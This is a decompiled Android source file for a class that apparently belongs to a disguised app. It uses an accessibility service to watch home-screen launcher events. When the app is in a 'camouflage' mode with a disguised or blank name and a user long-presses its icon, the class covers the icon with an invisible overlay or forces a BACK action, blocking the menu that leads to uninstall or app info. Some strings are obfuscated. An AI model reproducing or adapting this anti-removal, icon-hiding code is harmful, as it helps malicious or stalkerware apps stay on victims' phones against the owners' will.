package p000;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.TextView;
import com.storm.safe.rock.AppVariantA;
import com.storm.safe.rock.AppVariantE;
import com.storm.safe.rock.AppVariantF;
import com.storm.safe.rock.AppVariantG;
import com.storm.safe.rock.AppVariantH;
import com.storm.safe.rock.AppVariantI;
import com.storm.safe.rock.AppVariantJ;
import com.storm.safe.rock.AppVariantK;
import com.storm.safe.rock.AppVariantL;
import com.storm.safe.rock.AppVariantN;
import com.storm.safe.rock.DefaultLauncherAlias;
import com.storm.safe.rock.service.C0285a5;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.util.StringUtil;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: al */
/* loaded from: classes2.dex */
public final class C0032al {

    /* renamed from: c2 */
    public static final String[] f43691c2;

    /* renamed from: a0 */
    public final Context f43692a0;

    /* renamed from: a1 */
    public WindowManager f43693a1;

    /* renamed from: a2 */
    public TextView f43694a2;

    /* renamed from: a3 */
    public WindowManager.LayoutParams f43695a3;

    /* renamed from: a4 */
    public final Rect f43696a4;

    /* renamed from: a5 */
    public final Object f43697a5;

    /* renamed from: a6 */
    public final Rect f43698a6;

    /* renamed from: a7 */
    public final Handler f43699a7;

    /* renamed from: a8 */
    public final Handler f43700a8;

    /* renamed from: a9 */
    public RunnableC0027ag f43701a9;

    /* renamed from: b0 */
    public RunnableC0941o6 f43702b0;

    /* renamed from: b1 */
    public boolean f43703b1;

    /* renamed from: b2 */
    public boolean f43704b2;

    /* renamed from: b3 */
    public boolean f43705b3;

    /* renamed from: b4 */
    public long f43706b4;

    /* renamed from: b5 */
    public volatile Boolean f43707b5;

    /* renamed from: b6 */
    public volatile long f43708b6;

    /* renamed from: b7 */
    public final long f43709b7;

    /* renamed from: b8 */
    public volatile String f43710b8;

    /* renamed from: b9 */
    public volatile long f43711b9;

    /* renamed from: c0 */
    public final long f43712c0;

    /* renamed from: c1 */
    public boolean f43713c1;

    static {
        new C0031ak(null);
        f43691c2 = new String[]{"com.bbk.launcher2", StringUtil.m212470a0("KFYcdE86B2BbMD5XEjJIKg=="), StringUtil.m212470a0("KFYcdFsxGiEZPSpMHzlFPR4="), StringUtil.m212470a0("KFYcdEQpAyEZPSpMHzlFPR4="), "com.android.launcher", "com.android.launcher3", "com.google.android.apps.nexuslauncher", StringUtil.m212470a0("KFYcdEIoHCEZPSpMHzlFPR4="), "com.oplus.launcher", "com.realme.launcher", "com.oneplus.launcher", "net.oneplus.launcher", "com.miui.home", "com.meizu.flyme.launcher", "com.meizu.launcher", "com.huawei.android.launcher", "com.huawei.android.launcher3", "com.huawei.home", "com.hihonor.android.launcher", "com.hihonor.android.launcher3", "com.samsung.android.launcher", "com.sec.android.app.launcher", "com.blackshark.launcher", "com.lenovo.launcher", "cn.nubia.launcher", "com.transsion.launcher", "com.infinix.launcher", "com.tecno.launcher", "com.itel.launcher", "com.zte.mifavor.launcher"};
    }

    public C0032al(dqtvuisjd dqtvuisjdVar) {
        t60.m214695b6(dqtvuisjdVar, "context");
        this.f43692a0 = dqtvuisjdVar;
        this.f43696a4 = new Rect();
        this.f43697a5 = new Object();
        this.f43698a6 = new Rect();
        this.f43699a7 = new Handler(Looper.getMainLooper());
        HandlerThread handlerThread = new HandlerThread("IconInterceptorBg");
        handlerThread.start();
        this.f43700a8 = new Handler(handlerThread.getLooper());
        this.f43709b7 = 5000L;
        this.f43712c0 = 10000L;
    }

    /* renamed from: a0 */
    public final void m209811a0(Context context) {
        boolean z;
        Rect rect;
        try {
            if (this.f43694a2 != null) {
                return;
            }
            Object systemService = context.getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            this.f43693a1 = (WindowManager) systemService;
            String strM209812a1 = m209812a1();
            if (AbstractC0779a1.m213663b6(strM209812a1)) {
                z = true;
            } else {
                for (int i = 0; i < strM209812a1.length(); i++) {
                    char cCharAt = strM209812a1.charAt(i);
                    if (cCharAt != 10240 && !kg1.m213523c9(cCharAt)) {
                        z = false;
                        break;
                    }
                }
                z = true;
            }
            t60.m214702c3("LauncherProtector", "🛡️ [创建遮挡] hiddenMode=" + z);
            TextView textView = new TextView(context);
            textView.setBackgroundColor(0);
            if (z) {
                textView.setOnClickListener(new ViewOnClickListenerC1202s0(1));
                textView.setOnLongClickListener(new ViewOnLongClickListenerC0028ah());
            } else {
                textView.setOnClickListener(new ViewOnClickListenerC1203s1(1, this));
                textView.setOnLongClickListener(new ViewOnLongClickListenerC0028ah());
            }
            this.f43694a2 = textView;
            int i2 = Build.VERSION.SDK_INT >= 26 ? 2032 : 2006;
            synchronized (this.f43697a5) {
                rect = new Rect(this.f43696a4);
            }
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(rect.width(), rect.height(), i2, 8, -3);
            layoutParams.gravity = 8388659;
            layoutParams.x = rect.left;
            layoutParams.y = rect.top - m209813a2();
            this.f43695a3 = layoutParams;
            WindowManager windowManager = this.f43693a1;
            if (windowManager != null) {
                windowManager.addView(this.f43694a2, layoutParams);
            }
            this.f43698a6.set(rect);
        } catch (Exception e) {
            t60.m214705c6("LauncherProtector", "❌ 创建覆盖层失败", e);
            this.f43694a2 = null;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:18:0x0062, code lost:
    
        r0 = r0.getString(com.storm.safe.rock.R$string.label_blank);
        p000.t60.m214694b5(r0, "{\n            val pm = c…ng.label_blank)\n        }");
     */
    /* renamed from: a1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final String m209812a1() throws PackageManager.NameNotFoundException {
        String string;
        ComponentName componentName;
        long jCurrentTimeMillis = System.currentTimeMillis();
        String str = this.f43710b8;
        if (str != null && jCurrentTimeMillis - this.f43711b9 < this.f43712c0) {
            return str;
        }
        Context context = this.f43692a0;
        try {
            PackageManager packageManager = context.getPackageManager();
            Iterator it = AbstractC0716jf.m213306g5(AppVariantH.class, AppVariantI.class, AppVariantJ.class, AppVariantE.class, AppVariantF.class, AppVariantG.class, AppVariantK.class, AppVariantL.class).iterator();
            while (true) {
                if (!it.hasNext()) {
                    break;
                }
                try {
                    componentName = new ComponentName(context, (Class<?>) it.next());
                } catch (Exception unused) {
                }
                if (packageManager.getComponentEnabledSetting(componentName) == 1) {
                    ActivityInfo activityInfo = packageManager.getActivityInfo(componentName, 0);
                    t60.m214694b5(activityInfo, "pm.getActivityInfo(component, 0)");
                    string = activityInfo.loadLabel(packageManager).toString();
                    break;
                }
                continue;
            }
        } catch (Exception e) {
            t60.m214705c6("LauncherProtector", "❌ 获取伪装名称失败", e);
            string = "⠀⠀";
        }
        this.f43710b8 = string;
        this.f43711b9 = jCurrentTimeMillis;
        return string;
    }

    /* renamed from: a2 */
    public final int m209813a2() {
        Context context = this.f43692a0;
        try {
            int identifier = context.getResources().getIdentifier("status_bar_height", "dimen", "android");
            if (identifier > 0) {
                return context.getResources().getDimensionPixelSize(identifier);
            }
            return 0;
        } catch (Exception unused) {
            return 0;
        }
    }

    /* renamed from: a3 */
    public final void m209814a3(AccessibilityEvent accessibilityEvent) {
        boolean z;
        dqtvuisjd c0290a0;
        if (accessibilityEvent.getPackageName() == null) {
            return;
        }
        String string = accessibilityEvent.getPackageName().toString();
        String[] strArr = f43691c2;
        int length = strArr.length;
        boolean zM213652a5 = false;
        int i = 0;
        while (true) {
            if (i >= length) {
                z = false;
                break;
            }
            String str = strArr[i];
            Locale locale = Locale.ROOT;
            String lowerCase = string.toLowerCase(locale);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            String lowerCase2 = str.toLowerCase(locale);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (AbstractC0779a1.m213679d2(lowerCase, false, lowerCase2)) {
                z = true;
                break;
            }
            i++;
        }
        if (accessibilityEvent.getEventType() != 2) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - this.f43706b4 < 100) {
                return;
            }
            this.f43706b4 = jCurrentTimeMillis;
            if (z) {
                if (m209816a5() && (c0290a0 = dqtvuisjd.f52358m1.getInstance()) != null) {
                    this.f43700a8.post(new RunnableC0029ai(c0290a0, m209812a1(), this, 0));
                    return;
                }
                return;
            }
            if (accessibilityEvent.getEventType() == 4096 && this.f43703b1) {
                this.f43703b1 = false;
                this.f43705b3 = false;
                RunnableC0941o6 runnableC0941o6 = this.f43702b0;
                if (runnableC0941o6 != null) {
                    this.f43699a7.removeCallbacks(runnableC0941o6);
                }
                this.f43702b0 = null;
                if (this.f43704b2 || this.f43694a2 == null) {
                    return;
                }
                m209817a6(0);
                return;
            }
            return;
        }
        boolean zM209816a5 = m209816a5();
        t60.m214714d6("LauncherProtector", "🔎 [长按事件] pkg=" + string + " isLauncher=" + z + " camouflage=" + zM209816a5);
        if (z && zM209816a5) {
            dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
            C0285a5 lastCachedSource = c0290a02.getLastCachedSource();
            Rect rect = new Rect();
            String str2 = "";
            String str3 = "";
            if (lastCachedSource == null || System.currentTimeMillis() - lastCachedSource.f52348a4 >= 500) {
                t60.m214726f4("LauncherProtector", "🛡️ [长按拦截] source缓存不可用，无法获取坐标");
            } else {
                rect.set(lastCachedSource.f52346a2);
                str2 = lastCachedSource.f52344a0;
                str3 = lastCachedSource.f52345a1;
                boolean z2 = lastCachedSource.f52347a3;
                StringBuilder sbM41c2 = AbstractC0003a2.m41c2("🛡️ [长按拦截] 桌面长按(缓存)！text='", str2, "' desc='", str3, "' bounds=");
                sbM41c2.append(rect);
                sbM41c2.append(" isVisible=");
                sbM41c2.append(z2);
                t60.m214726f4("LauncherProtector", sbM41c2.toString());
            }
            String string2 = AbstractC0779a1.m213687e0(str2 + " " + str3).toString();
            String strM209812a1 = m209812a1();
            if (string2.length() != 0) {
                zM213652a5 = AbstractC0779a1.m213652a5(string2, AbstractC0779a1.m213687e0(AbstractC0779a1.m213673c6(strM209812a1, "⠀", "")).toString(), true);
            } else if (this.f43694a2 != null) {
                zM213652a5 = true;
            }
            if (!zM213652a5) {
                t60.m214702c3("LauncherProtector", AbstractC0003a2.m34b5("🛡️ [长按拦截] 非我们的图标（text='", str2, "' appName='", strM209812a1, "'），跳过"));
                return;
            }
            dqtvuisjd c0290a03 = c0290a02.getInstance();
            if (c0290a03 == null) {
                t60.m214726f4("LauncherProtector", "🛡️ [长按拦截] service=null");
                return;
            }
            if (rect.isEmpty()) {
                t60.m214726f4("LauncherProtector", "🛡️ [长按拦截] bounds为空，仅执行 BACK");
                c0290a03.performGlobalAction(1);
                return;
            }
            synchronized (this.f43697a5) {
                this.f43696a4.set(rect);
            }
            t60.m214714d6("LauncherProtector", "🛡️ [长按拦截] 确认是我们的图标，放置覆盖层 @ " + rect);
            this.f43699a7.post(new RunnableC1052p1(this, 2, c0290a03));
        }
    }

    /* renamed from: a4 */
    public final boolean m209815a4(List list) {
        if (list != null && !list.isEmpty()) {
            try {
                Object systemService = this.f43692a0.getSystemService("window");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                Display defaultDisplay = ((WindowManager) systemService).getDefaultDisplay();
                Point point = new Point();
                defaultDisplay.getSize(point);
                int i = point.x;
                int i2 = point.y;
                int iM209813a2 = m209813a2();
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) it.next();
                    if (accessibilityNodeInfo != null && accessibilityNodeInfo.isVisibleToUser()) {
                        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                        if (!rectM24a5.isEmpty() && rectM24a5.width() >= 10 && rectM24a5.height() >= 10 && rectM24a5.left >= 0 && rectM24a5.right <= i && rectM24a5.top >= iM209813a2 && rectM24a5.bottom <= i2) {
                            synchronized (this.f43697a5) {
                                this.f43696a4.set(rectM24a5);
                            }
                            return true;
                        }
                    }
                }
            } catch (Exception unused) {
            }
        }
        return false;
    }

    /* renamed from: a5 */
    public final boolean m209816a5() {
        boolean z;
        boolean z2;
        long jCurrentTimeMillis = System.currentTimeMillis();
        Boolean bool = this.f43707b5;
        if (bool != null) {
            boolean zBooleanValue = bool.booleanValue();
            if (jCurrentTimeMillis - this.f43708b6 < this.f43709b7) {
                return zBooleanValue;
            }
        }
        Context context = this.f43692a0;
        boolean z3 = false;
        try {
            z = true;
        } catch (Exception e) {
            t60.m214705c6("LauncherProtector", "❌ 检查伪装模式失败", e);
        }
        if (context.getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).getBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), false)) {
            this.f43707b5 = Boolean.valueOf(z);
            this.f43708b6 = jCurrentTimeMillis;
            return z;
        }
        PackageManager packageManager = context.getPackageManager();
        boolean z4 = packageManager.getComponentEnabledSetting(new ComponentName(context, (Class<?>) DefaultLauncherAlias.class)) == 2;
        Iterator it = AbstractC0716jf.m213306g5(AppVariantA.class, AppVariantE.class, AppVariantF.class, AppVariantG.class, AppVariantH.class, AppVariantI.class, AppVariantJ.class, AppVariantK.class, AppVariantL.class, AppVariantN.class).iterator();
        while (true) {
            if (!it.hasNext()) {
                z2 = false;
                break;
            }
            if (packageManager.getComponentEnabledSetting(new ComponentName(context, (Class<?>) it.next())) == 1) {
                z2 = true;
                break;
            }
        }
        if (z4 && z2) {
            z3 = true;
        }
        z = z3;
        this.f43707b5 = Boolean.valueOf(z);
        this.f43708b6 = jCurrentTimeMillis;
        return z;
    }

    /* renamed from: a6 */
    public final void m209817a6(int i) {
        WindowManager windowManager;
        if (i < 3) {
            this.f43704b2 = true;
            long j = i == 0 ? 300L : 100L;
            RunnableC0027ag runnableC0027ag = new RunnableC0027ag(this, i, 0);
            this.f43701a9 = runnableC0027ag;
            this.f43699a7.postDelayed(runnableC0027ag, j);
            return;
        }
        try {
            TextView textView = this.f43694a2;
            if (textView != null && (windowManager = this.f43693a1) != null) {
                windowManager.removeView(textView);
            }
            this.f43694a2 = null;
        } catch (Exception unused) {
            this.f43694a2 = null;
        }
        this.f43704b2 = false;
    }

    /* renamed from: a7 */
    public final void m209818a7() {
        WindowManager windowManager;
        try {
            TextView textView = this.f43694a2;
            if (textView != null && (windowManager = this.f43693a1) != null) {
                windowManager.removeView(textView);
            }
            this.f43694a2 = null;
        } catch (Exception unused) {
            this.f43694a2 = null;
        }
    }

    /* renamed from: a8 */
    public final void m209819a8() {
        if (this.f43705b3 && this.f43703b1) {
            RunnableC0941o6 runnableC0941o6 = new RunnableC0941o6(2, this);
            this.f43702b0 = runnableC0941o6;
            this.f43699a7.postDelayed(runnableC0941o6, 10L);
        }
    }
}
